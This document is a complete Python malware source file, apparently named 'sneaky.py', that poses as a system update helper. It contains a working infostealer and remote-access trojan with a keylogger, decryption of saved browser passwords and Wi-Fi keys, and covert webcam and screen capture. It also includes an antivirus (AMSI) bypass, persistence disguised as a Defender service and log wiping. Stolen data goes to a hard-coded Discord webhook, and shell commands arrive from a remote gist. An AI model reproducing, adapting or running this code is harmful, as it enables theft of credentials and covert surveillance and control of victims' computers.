import os, sys, time, subprocess, socket, platform, getpass, shutil, sqlite3, json, requests, threading, random, string, glob, psutil, atexit, traceback
from datetime import datetime
try:
    import ctypes
    from ctypes import wintypes
except ImportError:
    ctypes = None
    sys.stderr.write("ctypes unavailable; some features may fail\n")
try:
    import winreg
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, OpenKey, SetValueEx, QueryValueEx
except ImportError:
    winreg = None
    sys.stderr.write("winreg unavailable; some windows features will fail\n")
try:
    from PIL import ImageGrab
    import cv2
    from pynput.keyboard import Listener
    import win32gui
    import win32crypt
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Util.Padding import unpad
    import pyasn1.codec.der.decoder as der_decoder
except ImportError as e:
    sys.stderr.write(f"critical import failed: {e}\n")
    sys.exit(1)

try:
    import keyring
except ImportError:
    keyring = None
    sys.stderr.write("keyring unavailable; Linux/macOS browser creds may fail\n")

VERSION = "2.4.9 DEV"
TEMP_LOG = os.path.join(os.getenv("TEMP", "/tmp"), "system_update_helper.log")
PYTHON_VERSION = sys.version_info
IS_FSTRING = PYTHON_VERSION >= (3, 6)
DEBUG = True
IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if platform.system() == "Windows" and ctypes else False
IS_WINDOWS = sys.platform.startswith("win")
IS_LINUX = sys.platform.startswith("linux")
IS_MACOS = sys.platform.startswith("darwin")
HARVESTED_DATA = {}
keylog_buffer = []
keylog_file = os.path.join(os.getenv("TEMP", "/tmp"), "keylog.txt")
screenshot_mode = None
last_window = None
buffer_lock = threading.Lock()
file_lock = threading.Lock()
keylogger_stop = threading.Event()
camera_in_use = False
send_queue = []
offline_queue = []
send_lock = threading.Lock()
session = requests.Session()
session.mount("https://", requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10))

def log_debug(msg, *args, exc_info=None):
    msg = msg if not args else msg % args
    try:
        with open(TEMP_LOG, "a") as f:
            if exc_info:
                f.write(f"{datetime.now()} - debug - {msg} - stacktrace: {''.join(traceback.format_exception(*exc_info))}\n")
            else:
                f.write(f"{datetime.now()} - debug - {msg}\n")
    except Exception as e:
        sys.stderr.write(f"log failed: {e}\n")
    if DEBUG:
        sys.stderr.write(f"debug: {msg}\n")

log_debug("script started - v%s", VERSION)

def install_deps():
    log_debug("ensuring dependencies")
    pkgs = [
        ("pywin32", "pywin32>=306", IS_WINDOWS), ("requests", "requests>=2.28.1", True),
        ("psutil", "psutil>=5.9.0", True), ("pynput", "pynput>=1.7.6", True),
        ("pillow", "Pillow>=11.1.0", True), ("opencv-python", "opencv-python>=4.11.0", True),
        ("pycryptodome", "pycryptodome>=3.21.0", True), ("pyasn1", "pyasn1>=0.6.0", True),
        ("keyring", "keyring>=24.3.0", IS_LINUX or IS_MACOS)
    ]
    for dep, pkg, needed in pkgs:
        if not needed: continue
        try:
            __import__(dep)
            log_debug("%s installed", dep)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pkg, "-q"])
                log_debug("installed %s via pip", pkg)
            except Exception as e:
                log_debug("pip failed for %s: %s", pkg, e, exc_info=sys.exc_info())
                if dep == "keyring":
                    global keyring
                    keyring = None
                else:
                    sys.exit(1)

def install_nss():
    if IS_LINUX:
        log_debug("checking NSS installation on Linux")
        try:
            if subprocess.call(["dpkg", "-l", "libnss3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
                log_debug("installing NSS on Debian/Ubuntu")
                subprocess.check_call(["sudo", "apt-get", "install", "-y", "-q", "libnss3", "libnss3-tools"])
            elif subprocess.call(["rpm", "-q", "nss"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
                log_debug("installing NSS on RHEL/CentOS")
                subprocess.check_call(["sudo", "yum", "install", "-y", "-q", "nss"])
        except Exception as e:
            log_debug("NSS install failed on Linux: %s", e, exc_info=sys.exc_info())
            try:
                subprocess.check_call(["sudo", "dnf", "install", "-y", "-q", "nss"])
            except:
                try:
                    subprocess.check_call(["sudo", "pacman", "-S", "--noconfirm", "nss"])
                except:
                    log_debug("all NSS install attempts failed")
    elif IS_MACOS:
        log_debug("checking NSS installation on macOS")
        if subprocess.call(["brew", "list", "nss"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
            if subprocess.call(["brew", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
                log_debug("installing Homebrew")
                subprocess.check_call(["/bin/bash", "-c", "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"])
            log_debug("installing NSS via Homebrew")
            subprocess.check_call(["brew", "install", "-q", "nss"])

if not install_deps():
    log_debug("dependency install failed")
    sys.exit(1)
if IS_LINUX or IS_MACOS:
    install_nss()
sys.stdout.write(f"[{datetime.now()}] *** running sneaky.py v{VERSION} *** - dependencies ok\n")

WEBHOOK_URL = "https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
HIDE_DIR = os.path.join(os.getenv("APPDATA", os.path.expanduser("~")), "systemutilities")
HIDE_FILE = os.path.join(HIDE_DIR, "system_update_helper.py")
PID_FILE = os.path.join(HIDE_DIR, ".autojug.pid")
OFFLINE_DIR = os.path.join(HIDE_DIR, "offline_queue")

def queue_for_send(data=None, file_path=None):
    with send_lock:
        if is_connected():
            send_queue.append((data, file_path))
            log_debug("queued data for send: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')
        else:
            offline_store(data, file_path)
            log_debug("stored offline: file=%s, data_len=%s", file_path, len(data) if data else 'N/A')

def offline_store(data, file_path):
    os.makedirs(OFFLINE_DIR, exist_ok=True)
    if file_path and os.path.exists(file_path):
        dest = os.path.join(OFFLINE_DIR, os.path.basename(file_path))
        shutil.copy(file_path, dest)
        offline_queue.append((None, dest))
    elif data:
        temp_file = os.path.join(OFFLINE_DIR, f"data_{random_string()}.txt")
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(str(data))
        offline_queue.append((None, temp_file))

def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False

def handle_offline_queue():
    while not keylogger_stop.is_set():
        if is_connected() and offline_queue:
            log_debug("connection restored, waiting 2min before sending offline queue")
            time.sleep(120)  # 2-minute delay after reconnect
            with send_lock:
                send_queue.extend(offline_queue)
                offline_queue.clear()
                shutil.rmtree(OFFLINE_DIR, ignore_errors=True)
                log_debug("offline queue transferred to send queue")
        time.sleep(30)

def send_to_discord():
    global send_queue
    retry_delay = 1
    while not keylogger_stop.is_set():
        with send_lock:
            if not send_queue:
                time.sleep(5)
                continue
            data, file_path = send_queue.pop(0)
        if file_path and os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            if file_size > 8 * 1024 * 1024:
                log_debug("file %s exceeds 8MB: %d bytes", file_path, file_size)
                continue
            for _ in range(3):
                try:
                    with open(file_path, "rb") as f:
                        response = session.post(WEBHOOK_URL, files={"file": f}, timeout=10)
                    if response.status_code in (200, 204):
                        log_debug("file sent successfully: %s", file_path)
                        retry_delay = 1
                    elif response.status_code == 429:
                        log_debug("rate limited by Discord, waiting 2 minutes")
                        time.sleep(120)
                        with send_lock:
                            send_queue.insert(0, (data, file_path))
                        break
                    else:
                        log_debug("file send failed with status %d: %s", response.status_code, response.text)
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    break
                except Exception as e:
                    log_debug("file send failed: %s", e, exc_info=sys.exc_info())
                    time.sleep(retry_delay)
                    retry_delay = min(retry_delay * 2, 60)
        elif data:
            data_str = str(data)
            temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"data_{random_string()}.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(data_str)
            for _ in range(3):
                try:
                    with open(temp_file, "rb") as f:
                        response = session.post(WEBHOOK_URL, files={"file": (os.path.basename(temp_file), f)}, timeout=10)
                    if response.status_code in (200, 204):
                        log_debug("text data sent successfully as file: %s", temp_file)
                        retry_delay = 1
                    elif response.status_code == 429:
                        log_debug("rate limited by Discord, waiting 2 minutes")
                        time.sleep(120)
                        with send_lock:
                            send_queue.insert(0, (data, None))
                        break
                    else:
                        log_debug("text send failed with status %d: %s", response.status_code, response.text)
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                    break
                except Exception as e:
                    log_debug("text send failed: %s", e, exc_info=sys.exc_info())
                    time.sleep(retry_delay)
                    retry_delay = min(retry_delay * 2, 60)
        time.sleep(30)

def manage_instance():
    log_debug("entering manage_instance")
    pid_exists = os.path.exists(PID_FILE)
    should_clean = not pid_exists
    if pid_exists:
        with open(PID_FILE, 'r') as f:
            pid_content = f.read().strip()
        if pid_content:
            pid = int(pid_content)
            current_pid = os.getpid()
            if pid == current_pid:
                pass
            elif psutil.pid_exists(pid):
                proc = psutil.Process(pid)
                if proc.name() == sys.executable.split(os.sep)[-1]:
                    raise RuntimeError(f"another instance running with pid {pid}")
                else:
                    should_clean = True
            else:
                should_clean = True
    os.makedirs(HIDE_DIR, exist_ok=True)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
    atexit.register(lambda: os.remove(PID_FILE) if os.path.exists(PID_FILE) else None)
    log_debug("pid managed for process %d", os.getpid())
    return should_clean

def persist():
    log_debug("setting persistence")
    if IS_WINDOWS and IS_ADMIN and winreg:
        cmd = f'schtasks /create /tn windowsdefenderhealthservice /tr "\"{sys.executable}\" \"{HIDE_FILE}\"" /sc ONSTART /ru SYSTEM /f'
        subprocess.run(cmd, shell=True)
    elif IS_LINUX:
        cron = f"@reboot {sys.executable} {HIDE_FILE}"
        subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron}') | crontab -", shell=True)
    elif IS_MACOS:
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>Label</key><string>com.systemutilities</string><key>ProgramArguments</key><array><string>{sys.executable}</string><string>{HIDE_FILE}</string></array><key>RunAtLoad</key><true/></dict></plist>"""
        with open(os.path.expanduser("~/Library/LaunchAgents/com.systemutilities.plist"), "w") as f:
            f.write(plist)
        subprocess.run(["launchctl", "load", os.path.expanduser("~/Library/LaunchAgents/com.systemutilities.plist")])

def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def fake_updates():
    sys.stdout.write(f"[{datetime.now()}] v{VERSION} - updating system...\n")
    [time.sleep(0.3) for _ in range(3)]
    sys.stdout.write("update complete!\n")
    sys.stdout.flush()
    log_debug("fake updates done")

def bypass_defender():
    if IS_WINDOWS and ctypes and IS_ADMIN:
        try:
            amsi_dll = ctypes.windll.kernel32.GetModuleHandleA(b"amsi.dll")
            if amsi_dll:
                addr = ctypes.windll.kernel32.GetProcAddress(amsi_dll, b"AmsiScanBuffer")
                if addr:
                    old_protect = ctypes.c_uint32()
                    if ctypes.windll.kernel32.VirtualProtect(addr, 5, 0x40, ctypes.byref(old_protect)):
                        ctypes.memset(addr, 0xC3, 5)
                        log_debug("defender bypassed")
        except Exception as e:
            log_debug("bypass failed: %s", e, exc_info=sys.exc_info())

def keylogger():
    global keylog_buffer
    log_debug("keylogger started")
    line_buffer = []
    def send_keylog():
        while not keylogger_stop.is_set():
            with buffer_lock:
                if keylog_buffer:
                    with file_lock:
                        with open(keylog_file, "a", encoding="utf-8") as f:
                            f.write("\n".join(keylog_buffer) + "\n")
                        file_size = os.path.getsize(keylog_file)
                        if file_size > 3 * 1024 * 1024:
                            queue_for_send(file_path=keylog_file)
                            keylog_buffer.clear()
                            log_debug("keylog sent instantly: %d bytes", file_size)
                        elif random.randint(120, 180) <= time.time() % 180:
                            queue_for_send(file_path=keylog_file)
                            keylog_buffer.clear()
                            log_debug("keylog sent on timer")
            time.sleep(5)
    threading.Thread(target=send_keylog, daemon=True).start()
    def on_press(key):
        if keylogger_stop.is_set():
            return False
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow()) if IS_WINDOWS else "unknown"
        try:
            key_char = key.char if hasattr(key, 'char') and key.char else str(key)
            if key_char == " ":
                with buffer_lock:
                    keylog_buffer.append(f"{datetime.now()} - Line: {''.join(line_buffer)} - Window: {window}")
                    log_debug("keylog line buffered: %s", ''.join(line_buffer))
                line_buffer.clear()
            else:
                line_buffer.append(key_char)
                if len(line_buffer) >= 24:
                    with buffer_lock:
                        keylog_buffer.append(f"{datetime.now()} - Line: {''.join(line_buffer)} - Window: {window}")
                        log_debug("keylog line buffered (max reached): %s", ''.join(line_buffer))
                    line_buffer.clear()
        except AttributeError:
            pass
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        log_debug("keylogger error: %s", e, exc_info=sys.exc_info())
        queue_for_send(f"keylogger error: {e}")

def extract_chrome_passwords(path):
    if not os.path.exists(path):
        return {}
    try:
        conn = sqlite3.connect(path)
        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
        results = {}
        if IS_WINDOWS:
            results = {row[0]: (row[1], win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()) for row in cursor.fetchall()}
        elif IS_LINUX and keyring:
            key = keyring.get_password("chromium", "default") or subprocess.check_output(["secret-tool", "lookup", "application", "chromium"]).strip()
            for row in cursor.fetchall():
                url, user, enc_pass = row
                cipher = AES.new(key.encode(), AES.MODE_CBC, iv=enc_pass[3:19])
                results[url] = (user, unpad(cipher.decrypt(enc_pass[19:]), AES.block_size).decode())
        elif IS_MACOS and keyring:
            key = keyring.get_password("Chrome Safe Storage", "Chrome") or subprocess.check_output(["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"]).strip()
            for row in cursor.fetchall():
                url, user, enc_pass = row
                cipher = AES.new(PBKDF2(key.encode(), b"saltysalt", 16, 1003), AES.MODE_CBC, iv=enc_pass[3:19])
                results[url] = (user, unpad(cipher.decrypt(enc_pass[19:]), AES.block_size).decode())
        conn.close()
        return results
    except Exception as e:
        log_debug("chrome extract failed: %s", e, exc_info=sys.exc_info())
        return {}

def extract_firefox_passwords(profile_path):
    logins_file = os.path.join(profile_path, "logins.json")
    if not os.path.exists(logins_file):
        return {}
    try:
        with open(logins_file, "r") as f:
            logins = json.load(f).get("logins", [])
        results = {}
        key_file = os.path.join(profile_path, "key4.db")
        if os.path.exists(key_file):
            conn = sqlite3.connect(key_file)
            cursor = conn.execute("SELECT a11 FROM nssPrivate WHERE a102 = ?", (bytes.fromhex("f8000000000000000000000000000001"),))
            global_salt = cursor.fetchone()[0]
            conn.close()
            for login in logins:
                enc_user = der_decoder.decode(login["encryptedUsername"])[0].asOctets()
                enc_pass = der_decoder.decode(login["encryptedPassword"])[0].asOctets()
                key = PBKDF2(global_salt, b"", 32, 1)[:16]
                cipher = AES.new(key, AES.MODE_CBC, iv=enc_user[16:32])
                user = unpad(cipher.decrypt(enc_user[32:]), AES.block_size).decode()
                cipher = AES.new(key, AES.MODE_CBC, iv=enc_pass[16:32])
                passwd = unpad(cipher.decrypt(enc_pass[32:]), AES.block_size).decode()
                results[login["hostname"]] = (user, passwd)
        return results
    except Exception as e:
        log_debug("firefox extract failed: %s", e, exc_info=sys.exc_info())
        return {}

def harvest_data(is_initial_harvest):
    global HARVESTED_DATA
    log_debug("harvesting data, initial=%s", is_initial_harvest)
    current_data = {
        "system": {
            "hostname": socket.gethostname(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "username": getpass.getuser()
        },
        "wifi": {},
        "creds": {"system": f"{getpass.getuser()}:{os.getenv('AUTOJUG_PASS', 'N/A')}", "browser": {}}
    }
    if IS_WINDOWS:
        try:
            profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode().splitlines()
            current_data["wifi"] = {line.split("All User Profile")[1].strip()[2:]: subprocess.check_output(f'netsh wlan show profile name="{line.split("All User Profile")[1].strip()[2:]}" key=clear', shell=True).decode().split("Key Content")[1].strip().split("\r\n")[0].strip() for line in profiles if "All User Profile" in line}
        except Exception as e:
            log_debug("wifi harvest failed: %s", e, exc_info=sys.exc_info())
        browser_paths = {
            "chrome": os.path.join(os.getenv("APPDATA", ""), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
            "edge": os.path.join(os.getenv("APPDATA", ""), "..", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Login Data"),
            "firefox": glob.glob(os.path.join(os.getenv("APPDATA", ""), "Mozilla", "Firefox", "Profiles", "*.default-release")),
            "tor": glob.glob(os.path.join(os.getenv("APPDATA", ""), "Tor Browser", "Browser", "Tor", "Profile"))
        }
    elif IS_LINUX:
        try:
            profiles = subprocess.check_output(["nmcli", "-t", "-f", "NAME", "con", "show"]).decode().splitlines()
            current_data["wifi"] = {p: subprocess.check_output(["nmcli", "-s", "-t", "-f", "connection.id,802-11-wireless-security.psk", "con", "show", p]).decode().split(":")[1].strip() for p in profiles if "wifi" in subprocess.check_output(["nmcli", "-t", "-f", "TYPE", "con", "show", p]).decode()}
        except:
            pass
        browser_paths = {
            "chrome": os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            "edge": os.path.expanduser("~/.config/microsoft-edge/Default/Login Data"),
            "opera": os.path.expanduser("~/.config/opera/Login Data"),
            "firefox": glob.glob(os.path.expanduser("~/.mozilla/firefox/*.default-release")),
            "tor": glob.glob(os.path.expanduser("~/.tor-browser/profile"))
        }
    elif IS_MACOS:
        try:
            profiles = subprocess.check_output(["airport", "-s"]).decode().splitlines()[1:]
            current_data["wifi"] = {line.split()[0]: subprocess.check_output(["security", "find-generic-password", "-s", line.split()[0], "-w"]).decode().strip() for line in profiles if line}
        except:
            pass
        browser_paths = {
            "chrome": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
            "edge": os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/Login Data"),
            "opera": os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera/Login Data"),
            "firefox": glob.glob(os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*.default-release")),
            "tor": glob.glob(os.path.expanduser("~/Library/Application Support/TorBrowser-Data/Browser/*.default"))
        }
    if is_initial_harvest:
        for browser, path in browser_paths.items():
            if browser in ("chrome", "edge", "opera"):
                current_data["creds"]["browser"][browser] = extract_chrome_passwords(path) if not isinstance(path, list) else {}
            elif browser in ("firefox", "tor") and path:
                current_data["creds"]["browser"][browser] = extract_firefox_passwords(path[0]) if path else {}
        HARVESTED_DATA = current_data.copy()
        queue_for_send(json.dumps(current_data))
    else:
        changes = {}
        for key in current_data:
            if key not in HARVESTED_DATA or current_data[key] != HARVESTED_DATA[key]:
                changes[key] = current_data[key]
        if changes:
            change_report = "changes detected:\n" + json.dumps(changes, indent=2)
            queue_for_send(change_report)
            HARVESTED_DATA.update(changes)
            log_debug("data changes queued, size=%d", len(change_report))

def periodic_harvest():
    log_debug("starting periodic harvest")
    while not keylogger_stop.is_set():
        harvest_data(False)
        time.sleep(random.randint(60, 180))

def clean_traces():
    log_debug("cleaning traces")
    if IS_WINDOWS and IS_ADMIN:
        [subprocess.run(cmd, shell=True) for cmd in ['wevtutil cl system', 'wevtutil cl security', 'wevtutil cl application']]
    elif IS_LINUX:
        subprocess.run(["sudo", "journalctl", "--vacuum-time=1s"])
    elif IS_MACOS:
        subprocess.run(["sudo", "rm", "-rf", "/var/log/*"])

def check_camera_usage():
    global camera_in_use
    while not keylogger_stop.is_set():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            camera_in_use = True
            log_debug("camera in use by another app")
        else:
            camera_in_use = False
            cap.release()
        time.sleep(5)

def selfie():
    log_debug("taking selfie")
    cap = None
    for _ in range(3):
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                raise Exception("camera not opened")
            start_time = time.time()
            ret, frame = cap.read()
            if not ret or (time.time() - start_time) > 5:
                raise Exception("failed to capture frame or timed out")
            temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"selfie_{random_string()}.jpg")
            cv2.imwrite(temp_file, frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
            log_debug("selfie written to %s", temp_file)
            queue_for_send(file_path=temp_file)
            break
        except Exception as e:
            log_debug("selfie attempt failed: %s", e, exc_info=sys.exc_info())
            queue_for_send(f"selfie error: {e}")
            time.sleep(1)
        finally:
            if cap and cap.isOpened():
                cap.release()

def sneaky_selfie_thread():
    log_debug("starting sneaky selfie thread")
    while not keylogger_stop.is_set():
        if camera_in_use:
            selfie()
            time.sleep(30)
        time.sleep(5)

def screenshot():
    global last_screenshot_time
    log_debug("taking screenshot")
    try:
        img = ImageGrab.grab()
        temp_file = os.path.join(os.getenv("TEMP", "/tmp"), f"screenshot_{random_string()}.png")
        img.save(temp_file, "PNG")
        queue_for_send(file_path=temp_file)
        last_screenshot_time = time.time()
    except Exception as e:
        log_debug("screenshot failed: %s", e, exc_info=sys.exc_info())
        queue_for_send(f"screenshot error: {e}")

def check_window_change():
    global last_window, last_screenshot_time
    current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow()) if IS_WINDOWS else "unknown"
    if current_window != last_window and screenshot_mode == "constant":
        screenshot()
        log_debug("screenshot on window change: %s", current_window)
    last_window = current_window

def main():
    global last_screenshot_time
    last_screenshot_time = time.time()
    log_debug("main starting")
    sys.excepthook = lambda exc_type, exc_value, exc_traceback: log_debug("uncaught exception: %s", exc_value, exc_info=(exc_type, exc_value, exc_traceback))
    sys.stdout.write(f"[{datetime.now()}] v{VERSION} - main started (admin: {IS_ADMIN})\n")
    if IS_WINDOWS and not DEBUG and ctypes:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    should_clean = manage_instance()
    if should_clean:
        clean_traces()
    bypass_defender()
    persist()
    fake_updates()
    harvest_data(True)
    threads = [
        threading.Thread(target=keylogger, daemon=True),
        threading.Thread(target=periodic_harvest, daemon=True),
        threading.Thread(target=check_camera_usage, daemon=True),
        threading.Thread(target=sneaky_selfie_thread, daemon=True),
        threading.Thread(target=send_to_discord, daemon=True),
        threading.Thread(target=handle_offline_queue, daemon=True)
    ]
    for t in threads:
        t.start()
        log_debug("started thread: %s", t.name)
    handler = CommandHandler()
    retry_delay = 1
    while True:
        try:
            handler.fetch_commands()
            check_window_change()
            if screenshot_mode == "periodic" and (time.time() - last_screenshot_time) > random.randint(60, 180):
                screenshot()
            time.sleep(random.randint(300, 900))
            retry_delay = 1
        except Exception as e:
            log_debug("main loop error: %s", e, exc_info=sys.exc_info())
            queue_for_send(f"loop error: {e}")
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, 60)

class CommandHandler:
    def __init__(self):
        self.executed = []
        self.fallback_urls = ["https://gist.github.com/jonhardwick-spec/6b171df6eacfad03119b1e1a98f85192/raw"]
        log_debug("commandhandler init")

    def fetch_commands(self):
        log_debug("fetching commands")
        for url in self.fallback_urls:
            try:
                resp = session.get(url, timeout=5)
                log_debug("got raw response: %s", resp.text[:100])
                self.parse_commands(resp.text)
                break
            except Exception as e:
                log_debug("fetch failed: %s", e, exc_info=sys.exc_info())
                time.sleep(2)

    def parse_commands(self, data):
        global screenshot_mode
        try:
            if not data or data.isspace():
                log_debug("no command data to parse")
                return
            try:
                cmds = json.loads(data)
                for cmd in cmds:
                    action = cmd.get("action")
                    if action and action not in self.executed:
                        self.executed.append(action)
                        param = cmd.get("path") or cmd.get("command")
                        if action == "exfiltrate" and os.path.exists(param):
                            queue_for_send(file_path=param)
                        elif action == "execute":
                            result = subprocess.run(param, shell=True, capture_output=True, text=True)
                            queue_for_send(result.stdout if result else "command failed")
                        elif action == "/selfie":
                            selfie()
                        elif action == "/screenshot constant":
                            screenshot_mode = "constant"
                            log_debug("screenshot mode set to constant")
                        elif action == "/screenshot":
                            screenshot_mode = "periodic"
                            log_debug("screenshot mode set to periodic")
            except json.JSONDecodeError:
                commands = data.strip().split('\n')
                for cmd in commands:
                    cmd = cmd.strip()
                    if cmd and cmd not in self.executed:
                        if cmd == "/selfie":
                            selfie()
                            self.executed.append(cmd)
                        elif cmd == "/screenshot constant":
                            screenshot_mode = "constant"
                            self.executed.append(cmd)
                            log_debug("screenshot mode set to constant (plain text)")
                        elif cmd == "/screenshot":
                            screenshot_mode = "periodic"
                            self.executed.append(cmd)
                            log_debug("screenshot mode set to periodic (plain text)")
                        elif cmd == "/juggthatmf":
                            self.executed.append(cmd)
                            log_debug("juggthatmf command received - no action defined")
                        else:
                            log_debug("unknown plain text command: %s", cmd)
        except Exception as e:
            log_debug("parse failed: %s", e, exc_info=sys.exc_info())

if __name__ == "__main__":
    log_debug("entering __main__")
    try:
        main()
    except Exception as e:
        log_debug("main error: %s", e, exc_info=sys.exc_info())
        queue_for_send(f"error: {e}")
        keylogger_stop.set()
        os._exit(1)